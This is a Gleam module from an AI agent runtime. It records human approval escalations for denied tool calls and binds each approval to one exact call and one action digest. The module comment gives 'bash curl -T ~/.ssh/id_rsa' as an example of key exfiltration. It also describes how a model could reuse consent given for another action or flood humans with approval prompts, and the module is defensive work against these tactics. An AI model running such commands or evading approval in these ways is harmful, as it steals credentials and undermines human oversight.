//// Durable approval escalations (design §5.3): the runtime-side record
//// of a broker denial awaiting a decision, the decision, and the single
//// consumed re-execution.
////
//// The broker's escalation state machine (`broker/escalation`) is pure
//// and process-local; §5.3 requires every lifecycle event to be
//// "recorded durably" before it is acted on. This module stores that
//// record in `fact.custom` registers under the reserved `escalation/`
//// key prefix, and the choice of registers over custom entries is
//// deliberate:
////
//// - an escalation is *current mutable state* (pending → approved →
////   consumed), which is exactly what registers are for; the tree is
////   write-once, so an entry-based record would need one entry per
////   transition plus a fold to answer "what is pending now";
//// - approval feeds back into tool clearance, which needs a bounded
////   point-lookup on the strand's hot path, not a branch scan;
//// - escalations must not move any strand's leaf or enter any context
////   projection — a mid-batch denial cannot be allowed to reparent the
////   conversation.
////
//// Status transitions are guarded by the register's seq (optimistic
//// CAS through the writer), so a lost race is a refused commit, never a
//// double consume. The denial and grant payloads are opaque JSON in the
//// broker's escalation vocabulary (`tools/tool.denial_to_json`,
//// `grant_to_json`); the runtime records and returns them without
//// interpreting them, keeping the spec's `E → A,B,C,D` dependency
//// direction intact (no broker import here).
////
//// An approval is attributed, never ambient (design §5.3: *one*
//// re-execution of the denied action, not a session-wide widening). The
//// record therefore carries the exact call identity it is currently
//// raised for — `{operation, strand, step, source index, call id}` — and
//// the driver's clearance path spends a grant only on a clearance whose
//// coordinates match. A record raised without a scope can still be spent
//// explicitly (`api.consume_escalation`) by a host that re-executes
//// outside the strand's own clearance, but no tool clearance will ever
//// load it: an unattributable grant failing to widen anything is the
//// safe direction.
////
//// The scope is the call holding the *claim*, and a claim moves
//// (`claimed`, committed under CAS by `api.claim_escalation`). It has to:
//// a record's id is a digest of the want rather than of the call, so a
//// model that reads an in-band refusal and retries arrives under a call
//// id the provider has only just minted, and a scope frozen to the first
//// attempt would name a call nothing can re-clear. What the exactness
//// buys is unchanged by that — one claimant at a time, one CAS from
//// `Approved` to `Consumed`, so one approval is one widened execution of
//// one call.
////
//// ## What the consent is about (#65)
////
//// The want is not the action. Two calls on one strand through one tool
//// asking for one policy diff digest to the same record id however
//// different the commands they would run, so inheriting an approval on
//// the strength of the id alone hands a human's "yes" about `bash true`
//// to `bash curl -T ~/.ssh/id_rsa …`. Design §5.3 grants one
//// re-execution *of the denied action*, so the record carries the
//// claimant's **action digest** alongside its scope, and an approval is
//// inherited only by a claimant whose action digests the same. A
//// mismatch is not a refusal but a fresh question: the record re-opens
//// as `Pending` bound to the new action, and the human is asked again.
////
//// The digest is computed by the client (`client/escalate.action_digest`
//// over the call's effective arguments) and stored here as an opaque
//// string. This module never renders, parses or compares anything about
//// a tool's arguments — that would import tool semantics into the
//// consent layer, and every field the consent layer decided to overlook
//// would be a field the model may vary after consent.
////
//// Re-opening is what #66 is about, and the new mismatch edge would make
//// it worse: a model that varies its arguments after each approval could
//// otherwise drive prompt cycles without bound. So a record counts the
//// questions it has asked (`asked`) and `claimed` refuses to re-open
//// past the caller's `max_asks`, leaving the record terminal and the
//// call to settle in band.

import core/corruption.{type CorruptionReport}
import core/ids.{type OpId}
import core/json.{type JsonValue}
import gleam/list
import gleam/option.{type Option, None, Some}
import gleam/result
import gleam/string

/// The observable lifecycle position of a durable escalation, mirroring
/// `broker/escalation.Status`.
pub type Status {
  /// Raised, awaiting a decision.
  Pending

  /// Approved with grants; the single re-execution has not run yet.
  Approved

  /// Rejected; no re-execution will ever run.
  Rejected

  /// The single approved re-execution has been taken.
  Consumed
}

/// The exact call a denial was raised for: which planned tool call, on
/// which strand, inside which operation and step. This is the unit an
/// approval attaches to — a clearance spends a grant only when every
/// coordinate matches, so an approval granted for one call can never
/// widen a different one (a different strand's, or a different step's).
///
/// A record's scope is the call that *currently holds the claim*, not
/// the call that first raised it. A later call whose denial digests to
/// the same record id — the same strand, the same tool, the same wanted
/// diff — takes the claim over (`claimed`, committed CAS-guarded by
/// `api.claim_escalation`), because a model that reads an in-band
/// refusal and retries always arrives under a call id the provider has
/// only just minted, and a scope frozen to a call that will never come
/// back is an approval nothing can ever spend. What the exactness buys
/// is still the whole of it: at any instant exactly one call holds the
/// claim, so exactly one call can consume the approval.
///
/// Constructor invariants: `operation`, `step_id`, and `source_index`
/// are the planner's coordinates for the planned call (the same triple
/// `ToolClearanceKey` carries); `strand` is the strand whose driver
/// clears it; `call_id` is the provider-minted tool call id, which names
/// exactly one call in the tree.
pub type CallScope {
  CallScope(
    operation: OpId,
    strand: String,
    step_id: String,
    source_index: Int,
    call_id: String,
  )
}

/// The action a claimant is asking to be allowed to run: what the
/// human's "yes" would actually authorize, as opposed to the policy
/// diff it would authorize it under.
///
/// All three fields are computed by the client that raises
/// (`client/escalate`), because rendering a tool's arguments is tool
/// knowledge and this module has none. Constructor invariants: `tool` is
/// the tool name — recoverable from nothing else, since the record id is
/// a one-way digest; `digest` is a stable digest of the call's effective
/// arguments, compared for equality and never interpreted; `preview` is
/// a **bounded** human rendering of those arguments, displayed and never
/// compared, bounded because the record is decoded on the clearance and
/// gateway-pull hot paths.
pub type Action {
  Action(tool: String, digest: String, preview: String)
}

/// One durable escalation record — the `fact.custom` payload stored
/// under `escalation/{id}`.
///
/// Constructor invariants: `id` is the caller-assigned stable escalation
/// id; `denial` is the structured denial as opaque JSON (reason, source,
/// wanted grants); `scope` is the exact call the denial was raised for
/// (`None` only for records raised through the unscoped legacy path,
/// which no clearance will ever spend); `grants` is empty until approval
/// and then holds the approved grant JSON values, a subset of the
/// denial's wanted diff (enforced by the broker layer that raises and
/// approves, not re-checked here); `status` moves only Pending →
/// Approved → Consumed or Pending → Rejected within one decision cycle,
/// and a fresh raise for the same want (`claimed`) starts a new cycle
/// from a decided record.
///
/// `tool`, `action` and `preview` are the current claimant's `Action`,
/// refreshed on every claim that moves the record, and `None` together
/// only on a record raised through a door that names no action (the
/// legacy shape, and `raise_escalation_for`). A record whose `action` is
/// `None` inherits no approval and satisfies no spend, for the same
/// reason an unscoped one widens nothing: consent that cannot be
/// attributed to an action must not authorize one.
///
/// `asked` counts the questions this row has put to a human — one for
/// the raise that opened it, one more for each re-opening — and is what
/// `claimed` bounds a re-asking loop against. It decodes as `0` on a
/// record written before it existed.
pub type Escalation {
  Escalation(
    id: String,
    denial: JsonValue,
    scope: Option(CallScope),
    grants: List(JsonValue),
    status: Status,
    tool: Option(String),
    action: Option(String),
    preview: Option(String),
    asked: Int,
  )
}

/// The reserved `fact.custom` key prefix escalations live under. Fact
/// writes through the api refuse keys under this prefix.
pub const key_prefix = "escalation/"

/// The `fact.custom` register key for an escalation id.
///
/// ## Examples
///
/// ```gleam
/// assert escalation.register_key("esc-1") == "escalation/esc-1"
/// ```
///
pub fn register_key(id: String) -> String {
  key_prefix <> id
}

/// Encodes an escalation record as its stored register payload.
///
/// ## Examples
///
/// ```gleam
/// // escalation.encode(record) |> escalation.decode == Ok(record)
/// ```
///
pub fn encode(escalation: Escalation) -> JsonValue {
  json.Object([
    #("id", json.String(escalation.id)),
    #("denial", escalation.denial),
    #("scope", encode_scope(escalation.scope)),
    #("grants", json.Array(escalation.grants)),
    #("status", json.String(status_to_string(escalation.status))),
    #("tool", encode_optional_string(escalation.tool)),
    #("action", encode_optional_string(escalation.action)),
    #("preview", encode_optional_string(escalation.preview)),
    #("asked", json.Int(escalation.asked)),
  ])
}

fn encode_optional_string(value: Option(String)) -> JsonValue {
  case value {
    None -> json.Null
    Some(text) -> json.String(text)
  }
}

fn encode_scope(scope: Option(CallScope)) -> JsonValue {
  case scope {
    None -> json.Null
    Some(scope) ->
      json.Object([
        #("operation", json.String(ids.op_id_to_string(scope.operation))),
        #("strand", json.String(scope.strand)),
        #("stepId", json.String(scope.step_id)),
        #("sourceIndex", json.Int(scope.source_index)),
        #("callId", json.String(scope.call_id)),
      ])
  }
}

/// Decodes a stored escalation payload. Total: anything malformed is a
/// corruption report, never a crash.
///
/// ## Examples
///
/// ```gleam
/// // escalation.decode(payload)
/// ```
///
pub fn decode(payload: JsonValue) -> Result(Escalation, CorruptionReport) {
  let where = "runtime/escalation.decode"
  case payload {
    json.Object(fields) -> {
      use id <- result.try(require_string(fields, "id", where))
      use denial <- result.try(require(fields, "denial", where))
      use scope <- result.try(decode_scope(fields, where))
      use grants_value <- result.try(require(fields, "grants", where))
      use grants <- result.try(case grants_value {
        json.Array(items) -> Ok(items)
        _ ->
          Error(corruption.report(
            at: where,
            on: "grants",
            expected: "an array of grant values",
            context: json.to_string(grants_value),
          ))
      })
      use status_text <- result.try(require_string(fields, "status", where))
      use status <- result.try(status_from_string(status_text, where))
      use tool <- result.try(optional_string(fields, "tool", where))
      use action <- result.try(optional_string(fields, "action", where))
      use preview <- result.try(optional_string(fields, "preview", where))
      use asked <- result.try(optional_int(fields, "asked", where))
      Ok(Escalation(
        id:,
        denial:,
        scope:,
        grants:,
        status:,
        tool:,
        action:,
        preview:,
        asked:,
      ))
    }
    other ->
      Error(corruption.report(
        at: where,
        on: "payload",
        expected: "an escalation object",
        context: json.to_string(other),
      ))
  }
}

// A stored scope decodes totally: an absent or null field is an unscoped
// record (the legacy shape, spendable only explicitly), while a present
// object must decode in full — a half-readable scope is corruption, not
// a record to fall back to unscoped, because falling back would change
// which calls the grant reaches.
fn decode_scope(
  fields: List(#(String, JsonValue)),
  where: String,
) -> Result(Option(CallScope), CorruptionReport) {
  case list.key_find(fields, "scope") {
    Error(Nil) | Ok(json.Null) -> Ok(None)
    Ok(json.Object(scope_fields)) -> {
      use operation_text <- result.try(require_string(
        scope_fields,
        "operation",
        where,
      ))
      use operation <- result.try(ids.parse_op_id(operation_text))
      use strand <- result.try(require_string(scope_fields, "strand", where))
      use step_id <- result.try(require_string(scope_fields, "stepId", where))
      use source_index <- result.try(require_int(
        scope_fields,
        "sourceIndex",
        where,
      ))
      use call_id <- result.try(require_string(scope_fields, "callId", where))
      Ok(
        Some(CallScope(operation:, strand:, step_id:, source_index:, call_id:)),
      )
    }
    Ok(other) ->
      Error(corruption.report(
        at: where,
        on: "scope",
        expected: "null or a call-scope object",
        context: json.to_string(other),
      ))
  }
}

// The four fields the action binding added decode totally on a record
// written before it existed: absent or null is "this record names no
// action", which inherits no approval and satisfies no spend. Present
// but of the wrong type stays corruption — a half-readable record is
// not one to fall back on, because falling back would change which
// claimant the record answers to.
fn optional_string(
  fields: List(#(String, JsonValue)),
  key: String,
  where: String,
) -> Result(Option(String), CorruptionReport) {
  case list.key_find(fields, key) {
    Error(Nil) | Ok(json.Null) -> Ok(None)
    Ok(json.String(text)) -> Ok(Some(text))
    Ok(other) ->
      Error(corruption.report(
        at: where,
        on: key,
        expected: "null or a string",
        context: json.to_string(other),
      ))
  }
}

fn optional_int(
  fields: List(#(String, JsonValue)),
  key: String,
  where: String,
) -> Result(Int, CorruptionReport) {
  case list.key_find(fields, key) {
    Error(Nil) | Ok(json.Null) -> Ok(0)
    Ok(json.Int(number)) -> Ok(number)
    Ok(other) ->
      Error(corruption.report(
        at: where,
        on: key,
        expected: "null or an integer",
        context: json.to_string(other),
      ))
  }
}

fn status_to_string(status: Status) -> String {
  case status {
    Pending -> "pending"
    Approved -> "approved"
    Rejected -> "rejected"
    Consumed -> "consumed"
  }
}

fn status_from_string(
  text: String,
  where: String,
) -> Result(Status, CorruptionReport) {
  case text {
    "pending" -> Ok(Pending)
    "approved" -> Ok(Approved)
    "rejected" -> Ok(Rejected)
    "consumed" -> Ok(Consumed)
    other ->
      Error(corruption.report(
        at: where,
        on: "status",
        expected: "pending, approved, rejected, or consumed",
        context: other,
      ))
  }
}

fn require(
  fields: List(#(String, JsonValue)),
  key: String,
  where: String,
) -> Result(JsonValue, CorruptionReport) {
  case list.key_find(fields, key) {
    Ok(value) -> Ok(value)
    Error(Nil) ->
      Error(corruption.report(
        at: where,
        on: key,
        expected: "a present field",
        context: "absent",
      ))
  }
}

fn require_string(
  fields: List(#(String, JsonValue)),
  key: String,
  where: String,
) -> Result(String, CorruptionReport) {
  use value <- result.try(require(fields, key, where))
  case value {
    json.String(text) -> Ok(text)
    other ->
      Error(corruption.report(
        at: where,
        on: key,
        expected: "a string",
        context: json.to_string(other),
      ))
  }
}

fn require_int(
  fields: List(#(String, JsonValue)),
  key: String,
  where: String,
) -> Result(Int, CorruptionReport) {
  use value <- result.try(require(fields, key, where))
  case value {
    json.Int(number) -> Ok(number)
    other ->
      Error(corruption.report(
        at: where,
        on: key,
        expected: "an integer",
        context: json.to_string(other),
      ))
  }
}

/// Whether a decided escalation may transition to `to` from its current
/// status: Pending decides (Approved/Rejected), Approved consumes.
///
/// ## Examples
///
/// ```gleam
/// assert escalation.may_become(escalation.Pending, escalation.Approved)
/// assert !escalation.may_become(escalation.Consumed, escalation.Consumed)
/// ```
///
pub fn may_become(from: Status, to: Status) -> Bool {
  case from, to {
    Pending, Approved | Pending, Rejected -> True
    Approved, Consumed -> True
    _, _ -> False
  }
}

/// The approved-but-unconsumed records in a decoded listing — the grants
/// a tool clearance is entitled to.
///
/// ## Examples
///
/// ```gleam
/// // escalation.approved(records)
/// ```
///
pub fn approved(records: List(Escalation)) -> List(Escalation) {
  list.filter(records, fn(record) { record.status == Approved })
}

/// Marks a record consumed (the caller commits it CAS-guarded).
///
/// ## Examples
///
/// ```gleam
/// // escalation.consume(record).status == escalation.Consumed
/// ```
///
pub fn consume(record: Escalation) -> Escalation {
  Escalation(..record, status: Consumed)
}

/// A fresh pending record for a raised denial, asked once. `scope` is
/// the exact call the denial names; `None` records a legacy unscoped
/// escalation that only an explicit `consume_escalation` can ever spend.
/// `action` is what the claimant is asking to run; `None` records an
/// escalation raised through a door that names no action, which no claim
/// inherits and no spend satisfies.
///
/// ## Examples
///
/// ```gleam
/// // escalation.raised("esc-1", denial_json, action: None, scope: Some(s))
/// ```
///
pub fn raised(
  id: String,
  denial: JsonValue,
  action action: Option(Action),
  scope scope: Option(CallScope),
) -> Escalation {
  let #(tool, digest, preview) = case action {
    None -> #(None, None, None)
    Some(Action(tool:, digest:, preview:)) -> #(
      Some(tool),
      Some(digest),
      Some(preview),
    )
  }
  Escalation(
    id:,
    denial:,
    scope:,
    grants: [],
    status: Pending,
    tool:,
    action: digest,
    preview:,
    asked: 1,
  )
}

/// What a claim did to a record.
pub type Claim {
  /// The claim moved: this is the record to commit.
  Claimed(record: Escalation)

  /// The claim would have re-opened a question this row has already
  /// asked `max_asks` times. Nothing is written, the record stays
  /// terminal, and the claimant settles in band without prompting
  /// anyone.
  Exhausted(record: Escalation)
}

/// The record after `scope`'s call raises the same denial against it —
/// the state transition `api.claim_escalation` commits under a CAS.
///
/// One record is one *question*, identified by the digest of the want
/// (`client/escalate.record_id`), and this is the only thing that moves
/// a question from one call to another. Which call holds it matters
/// because a scoped approval is spent by the claimant and nobody else:
///
/// - **Pending** — nobody has decided yet, so the claim simply moves and
///   the stored denial, action and preview are refreshed to the live
///   call's. One row, one prompt, and the human reads what the call in
///   hand actually wants and what it would run.
/// - **Approved on the same action** — a human said yes to this want, on
///   this strand, for this tool, running *this*; the grants they chose
///   are unchanged and the claim moves so the approval can be spent by a
///   call that exists. This is the retry the whole claim mechanism is
///   for. It cannot widen anything beyond what was approved: the grants
///   are the record's, not the claimant's.
/// - **Approved on a different action** — the consent in hand is about
///   an action nobody is proposing any more (#65). It is not inherited
///   and it is not silently kept either: the record re-opens as a fresh
///   `Pending` question bound to the new action, with no grants, and the
///   claimant settles in band exactly as a first refusal would.
/// - **Rejected** or **Consumed** — the previous cycle is over, and a
///   new raise re-opens the question, so one approval stays worth
///   exactly one execution and one denial stays a decision about one
///   call rather than a session-lifetime verdict on the want.
///
/// Every re-opening is a question a human has to answer, and the party
/// provoking them is the party this mechanism exists to constrain, so a
/// row that has already asked `max_asks` times refuses to ask again
/// (`Exhausted`) rather than re-opening for a fourth.
///
/// ## Examples
///
/// ```gleam
/// // escalation.claimed(record, denial, action, scope, max_asks: 3)
/// ```
///
pub fn claimed(
  record: Escalation,
  denial: JsonValue,
  action: Action,
  scope: CallScope,
  max_asks max_asks: Int,
) -> Claim {
  case record.status {
    Pending ->
      Claimed(
        Escalation(
          ..record,
          denial:,
          scope: Some(scope),
          tool: Some(action.tool),
          action: Some(action.digest),
          preview: Some(action.preview),
        ),
      )
    Approved ->
      case bound_to(record, action.digest) {
        True -> Claimed(Escalation(..record, scope: Some(scope)))
        False -> reopened(record, denial, action, scope, max_asks)
      }
    Rejected | Consumed -> reopened(record, denial, action, scope, max_asks)
  }
}

// A new cycle on an old row: the same id, the claimant's denial and
// action, no grants, and one more question on the counter.
fn reopened(
  record: Escalation,
  denial: JsonValue,
  action: Action,
  scope: CallScope,
  max_asks: Int,
) -> Claim {
  case record.asked >= max_asks {
    True -> Exhausted(record)
    False ->
      Claimed(
        Escalation(
          ..raised(record.id, denial, action: Some(action), scope: Some(scope)),
          asked: record.asked + 1,
        ),
      )
  }
}

/// Whether an escalation's scope names exactly this call. Unscoped
/// records match nothing — a grant that cannot be attributed must not
/// widen anything (the safe direction: skipping a record can only
/// narrow what a call receives).
///
/// ## Examples
///
/// ```gleam
/// // escalation.scoped_to(record, scope) == True
/// ```
///
pub fn scoped_to(record: Escalation, scope: CallScope) -> Bool {
  record.scope == Some(scope)
}

/// Whether an escalation is bound to exactly this action digest —
/// design §5.3's "of the denied action", asked as a string comparison
/// over a digest this module never computes.
///
/// A record with no action bound matches nothing, which is the same
/// direction `scoped_to` takes with an unscoped record and for the same
/// reason: consent that cannot be attributed to an action must not
/// authorize one. Such a record re-opens on the next claim, carrying
/// the live claimant's action, rather than being spendable by anything.
///
/// ## Examples
///
/// ```gleam
/// // escalation.bound_to(record, "9f2c…") == True
/// ```
///
pub fn bound_to(record: Escalation, action: String) -> Bool {
  record.action == Some(action)
}

/// The record after an approval with `grants`.
///
/// ## Examples
///
/// ```gleam
/// // escalation.approve(record, grants)
/// ```
///
pub fn approve(record: Escalation, grants: List(JsonValue)) -> Escalation {
  Escalation(..record, grants:, status: Approved)
}

/// The record after a rejection.
///
/// ## Examples
///
/// ```gleam
/// // escalation.reject(record)
/// ```
///
pub fn reject(record: Escalation) -> Escalation {
  Escalation(..record, status: Rejected)
}

/// The bare escalation id when the register key carries the escalation
/// prefix.
///
/// ## Examples
///
/// ```gleam
/// assert escalation.id_of_key("escalation/esc-1") == option.Some("esc-1")
/// ```
///
pub fn id_of_key(key: String) -> option.Option(String) {
  case string.starts_with(key, key_prefix) {
    True -> Some(string.drop_start(key, string.length(key_prefix)))
    False -> None
  }
}
